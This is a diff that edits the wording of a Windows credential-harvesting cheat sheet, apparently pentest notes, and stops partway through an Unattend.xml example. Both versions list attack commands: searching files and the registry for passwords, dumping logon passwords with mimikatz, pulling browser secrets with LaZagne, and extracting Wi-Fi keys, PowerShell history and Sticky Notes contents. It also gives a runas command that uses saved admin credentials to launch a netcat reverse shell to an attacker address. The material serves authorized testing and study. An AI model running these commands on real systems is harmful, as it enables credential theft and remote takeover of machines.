@@ -2,158 +2,136 @@
 legal-banner: true
 ---
 
-### **FILE SEARCHING COMMANDS**
+### **File searching commands**
 
-1.  Search for potentially risky files in the current directory and its subdirectories:  
+1.  Search for potentially risky files in the current directory and subdirectories:  
     `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*`
     
-2.  Search for cleartext credentials:  
+2.  Search for cleartext credentials in XML files:  
     `gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword`
     
-3.  search for IIS Web config file  
+3.  Search for IIS web.config files:  
     `Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue`
     
-4.  Find Files Containing "Password" Across Common Configuration File Types:  
+4.  Find files containing the word "password" across common configuration file types:  
     `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat *.zip`
     
-5.  Hunt for SAM and SYSTEM Backups  
+5.  Hunt for SAM and SYSTEM backups:  
     `cd C: & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK`
     
-6.  Use Tools Like winPEAS to Search for Files Containing Credentials:  
+6.  Use **winPEAS** to search for credential files:  
     `.\winPEASany.exe quiet cmd searchfast filesinfo`
-    
 
-### **SEARCHING FOR CREDENTIALS IN THE REGISTRY**
+### **Searching for credentials in the registry**
 
-3.  Search for Passwords in HKEY_LOCAL_MACHINE (HKLM)  
+1.  Search for passwords in `HKLM`:  
     `reg query HKLM /f password /t REG_SZ /s`
-4.  Search for Passwords in HKEY_CURRENT_USER (HKCU)  
-    `reg query HKLU /f password /t REG_SZ /s`
-5.  Retrieve Credentials from PuTTY  
-    `reg query HKEY_CURRENT_USERSoftwareSimonTathamPuTTYSessions /f "Proxy" /s`
+2.  Search for passwords in `HKCU`:  
+    `reg query HKCU /f password /t REG_SZ /s`
+3.  Retrieve PuTTY credentials:  
+    `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions /f "Proxy" /s`
 
-### **SAVED WINDOWS CREDENTIALS**
+### **Saved Windows credentials**
 
-Windows provides the functionality to use and save other users' credentials. The following commands help list and Use these saved credentials:
+Windows allows saving credentials for reuse. These commands help enumerate and leverage them:
 
-1.  Automatically Identify Saved Credentials with winPEAS:  
+1.  Identify saved credentials with **winPEAS**:  
     `.\winPEASx64.exe quiet cmd windowscreds`
-2.  Check AutoLogon Credentials in registry:  
-    `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
-3.  Extract plaintext passwords from memory using mimikatz:  
+2.  Check AutoLogon credentials in the registry:  
+    `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+3.  Extract plaintext passwords from memory with mimikatz:  
     `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`
-4.  Manually List Saved Credentials:  
+4.  Manually list saved credentials:  
     `cmdkey /list`
-5.  Run Command with Saved Credentials:  
+5.  Run commands with saved credentials:  
     `runas /savecred /user:admin cmd.exe`
-6.  Prepare to Receive a Reverse Shell with Netcat:  
+6.  Start a Netcat listener:  
     `nc -lvnp 1337`
-7.  Execute Commands Using Saved Credentials for a Reverse Shell:  
-    `runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe [IP-ADRESS] 1337 -e cmd.exe"`
+7.  Use saved credentials to trigger a reverse shell:  
+    `runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe [IP-ADDRESS] 1337 -e cmd.exe"`
 
-### **POWERSHELL HISTORY FILE**
+### **PowerShell history file**
 
-1.  Locate PowerShell History File:  
+1.  Locate the PowerShell history file:  
     `(Get-PSReadLineOption).HistorySavePath`
-2.  Read Contents of PowerShell History File:  
+2.  Read contents of the history file:  
     `gc (Get-PSReadLineOption).HistorySavePath`
-3.  Retrieve PowerShell History Files for All Users:  
+3.  Retrieve history for all users:  
     `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`
 
-### **BROWSER CREDENTIALS**
+### **Browser credentials**
 
-1.  Extract browser credentials using LaZagne:  
+1.  Extract browser credentials with LaZagne:  
     `lazagne.exe browsers`
-2.  Chrome Password  
-    `gc 'C:UsersuserAppDataLocalGoogleChromeUser DataDefaultCustom Dictionary.txt' | Select-String password`
+2.  Example: Search Chrome dictionary file for "password":  
+    `gc 'C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`
 
-### **POWERSHELL CREDENTIALS**
+### **PowerShell credentials**
 
-1.  Import Credentials from XML File:  
+1.  Import credentials from XML:  
     `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`
-    
-2.  Retrieve Username from Imported Credentials:  
+2.  Retrieve username:  
     `$credential.GetNetworkCredential().Username`
-    
-3.  Retrieve Password from Imported Credentials:  
+3.  Retrieve password:  
     `$credential.GetNetworkCredential().Password`
-    
-4.  Complete Example to Decrypt and Display Username and Password:
-    
-    ```PowerShell
+4.  Full example:  
+
+    ```powershell
     $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
     $username = $credential.GetNetworkCredential().Username
     $password = $credential.GetNetworkCredential().Password
     "Username: $username"
     "Password: $password"
     ```
-    
 
-### **STICKY NOTES PASSWORDS**
+### **Sticky Notes passwords**
 
-1.  Locate Sticky Notes Database Files:  
+1.  Locate Sticky Notes database:  
     `ls C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`
-    
-2.  Set Execution Policy to Bypass for the Current Process:  
-    `PS C:\> Set-ExecutionPolicy Bypass -Scope Process`
-    
-3.  Change Directory to Where PSSQLite is Located:  
-    `PS C:\> cd .\PSSQLite\`
-    
+2.  Allow PowerShell execution in current process:  
+    `Set-ExecutionPolicy Bypass -Scope Process`
+3.  Navigate to the PSSQLite module directory:  
+    `cd .\PSSQLite\`
 4.  Import the PSSQLite module:  
-    `PS C:\PSSQLite> Import-Module .\PSSQLite.psd1`
-    
-5.  Define the path to the Sticky Notes database file:  
-    `PS C:\PSSQLite> $db = 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'`
-    
-6.  Query Database to Retrieve Text of Notes:  
-    `PS C:\PSSQLite> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | Format-Table -Wrap`
-    
-7.  Extract and View Contents of Database File Using Strings Command:  
+    `Import-Module .\PSSQLite.psd1`
+5.  Define the database path:  
+    `$db = 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'`
+6.  Query the database:  
+    `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | Format-Table -Wrap`
+7.  Alternative: dump contents with `strings`:  
     `strings 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite-wal'`
-    
 
-### **WIFI PASSWORDS**
+### **Wi-Fi passwords**
 
-1.  View List of All Saved Wireless Networks:  
-    `PS C:\> netsh wlan show profile`
-    
-2.  Retrieve Password for a Specific Wireless Network Profile:  
-    `PS C:\> netsh wlan show profile [PROFILE-NAME] key=clear`
-    
-3.  Oneliner method to extract wifi passwords from all the access point.  
+1.  List saved wireless networks:  
+    `netsh wlan show profile`
+2.  Retrieve password for a profile:  
+    `netsh wlan show profile [PROFILE-NAME] key=clear`
+3.  One-liner to extract all saved Wi-Fi passwords:  
     `cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`
-    
 
-### **UNATTEND.XML**
+### **Unattend.xml**
 
-When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
+Windows Deployment Services often leave unattended installation files containing admin credentials.
 
-### **MANUALLY**
+#### **Manually check common locations**
 
-1.  `C:\Unattend.xml`
+- `C:\Unattend.xml`  
+- `C:\Windows\Panther\Unattend.xml`  
+- `C:\Windows\Panther\Unattend\Unattend.xml`  
+- `C:\Windows\System32\sysprep.inf`  
+- `C:\Windows\System32\sysprep\sysprep.xml`
 
-2.  `C:\Windows\Panther\Unattend.xml`
+#### **Automatically search**
 
-3.  `C:\Windows\Panther\Unattend\Unattend.xml`
-    
-4.  `C:\Windows\System32\sysprep.inf`
-    
-5.  `C:\Windows\System32\sysprep\sysprep.xml`
-    
-
-### **AUTOMATICALLY**
-
-1.  Perform a detailed search for unattended and sysprep files:  
+1.  Find unattended/sysprep files:  
     `Get-ChildItem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue`
-    
-2.  Search for specific log and configuration files:  
+2.  Search for specific filenames:  
     `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`
-    
-3.  Search for the term 'password' in all files:  
+3.  Search for "password" in all files:  
     `findstr /spin "password" *.*`
-    
-4.  Open the Unattend.xml File with a Text Editor to Review Content:  
+4.  Example from `Unattend.xml`:  
+
     ```xml
     <AutoLogon>
         <Password>
